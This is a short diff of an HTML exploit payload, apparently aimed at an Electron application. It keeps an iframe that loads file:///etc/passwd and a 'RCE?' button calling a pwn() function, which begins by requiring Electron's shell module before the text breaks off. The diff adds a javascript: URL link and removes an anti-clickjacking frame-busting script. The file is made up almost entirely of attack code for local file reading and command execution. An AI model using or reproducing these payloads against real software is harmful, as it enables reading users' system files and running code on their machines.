@@ -1,14 +1,7 @@
 <style id="antiClickjack">body{display:none !important;}</style>
 <iframe src="file:///etc/passwd"></iframe>
+<a href="javascript:alert(document.location)">Location</a>
 <button onclick=pwn()>RCE?</button>
-<script type="text/javascript">
-   if (self === top) {
-       var antiClickjack = document.getElementById("antiClickjack");
-       antiClickjack.parentNode.removeChild(antiClickjack);
-   } else {
-       top.location = self.location;
-   }
-</script>
 <script>
 	function pwn() {
 		const {shell} = require('electron');
